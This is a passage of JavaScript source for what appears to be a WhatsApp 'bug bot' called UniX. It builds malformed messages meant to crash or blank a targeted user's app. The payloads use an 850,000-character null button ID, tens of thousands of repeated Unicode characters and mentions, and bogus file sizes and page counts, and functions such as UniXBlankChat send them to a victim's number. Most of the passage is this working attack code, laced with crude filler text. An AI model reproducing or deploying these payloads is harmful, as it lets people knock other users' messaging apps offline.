                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Andro - ( UniX.Official ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "𐎟 UNiX𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/aboutrvr",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: bijipler,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! UniX.Bug.Bot',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: "https://files.catbox.moe/m33kq5.jpg",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `UniX 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "By : UniX",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Zeph.relayMessage(bijipler, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: bijipler },
  });
}

async function UniXBlankChat(Zeph, bijipler) {
  const jids = `_*~@5~*_\n`.repeat(10500);
  const ui = "ꦽ".repeat(80000);
  await Zeph.relayMessage(bijipler, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "99999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "©UNiX",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "🩸 𝙸𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎" + ui + jids
          },
          contextInfo: {
            mentionedJid: [bijipler],
            mentions: ["0@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "99999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "🩸 𝙸𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: bijipler
    }
  } : {});
}


(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();
    console.log("Sukses connected");
    bot.launch();
    
    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.red("\nCURSE TR UNITY"));
    console.log(chalk.bold.white("DEVELOPER: RLOO11"));
    console.log(chalk.bold.white("VERSION: 1.0.0"));
    console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("ZZZ"));
})();